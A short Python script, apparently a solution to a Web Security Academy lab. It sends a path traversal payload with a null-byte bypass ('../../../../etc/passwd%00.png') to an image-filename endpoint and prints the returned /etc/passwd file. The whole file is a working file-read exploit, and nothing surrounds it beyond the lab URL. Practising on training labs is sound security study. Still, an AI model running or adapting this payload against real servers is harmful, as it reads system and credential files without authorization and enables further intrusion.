#!/usr/bin/python3

import requests

def dt_image(url, api):

    payload = "../../../../etc/passwd%00.png"

    r = requests.get(url + api + payload)
    print(r.text)
    
if __name__ == '__main__':
    url = "https://ac0e1f9f1f95d628c0883fdf00fc0064.web-security-academy.net"
    api = "/image?filename="

    dt_image(url, api)